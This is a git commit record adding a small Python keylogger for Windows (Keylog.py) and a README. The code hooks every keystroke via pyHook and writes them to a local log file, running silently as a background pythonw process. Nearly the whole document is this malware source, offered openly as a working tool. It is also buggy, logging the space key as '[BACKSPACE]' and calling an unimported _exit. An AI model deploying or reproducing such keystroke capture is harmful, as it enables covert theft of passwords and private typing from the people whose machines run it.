f43fe0ffab8682aa8717ba33a6cb80223d19b35e
sigalsax <ssax18@gmail.com>
2017-11-03 09:24:20 -0400

    first commit keylog

---
+++ Keylog.py
@@ -0,0 +1,32 @@
+'''
+Sigal Sax
+Keylogger that captures user's key strokes
+To close program, Task Manager> Programs> Background Processes> END pythonw (32 bit)
+'''
+import pythoncom, pyHook
+
+def OnKeyBoardEvent(event):
+    f=open("file_log.txt","r")
+    buffer=f.read()
+    f.close()
+    f=open("file_log.txt", "w")
+    keylogs= chr(event.Ascii)
+    if event.Ascii==5:
+        _exit(1)
+    #if buffer.length==10:
+    #    print ('\n')
+    if event.Ascii==13:
+        keylogs='[ENTER]'
+    elif event.Ascii==8:
+        keylogs='[BACKSPACE]'
+    elif event.Ascii== 32:
+        keylogs='[BACKSPACE]'
+    buffer+=keylogs
+    f.write(buffer)
+    f.close()
+
+# set hook on windows events
+hm= pyHook.HookManager()
+hm.KeyDown= OnKeyBoardEvent
+hm.HookKeyboard()
+pythoncom.PumpMessages()
---
+++ README.txt
@@ -0,0 +1,4 @@
+This program (Keylog_Sax) captures user's key strokes
+- Perquisite: must have Python 2.7 running in order to run compiled program correctly
+- To close program, Task Manager> Programs> Background Processes> END pythonw (32 bit)
+- To ensure this program works correctly, please ensure that the folder path is the following: C:\\Users\\Administrator\\Desktop\\KeyLog_Sax
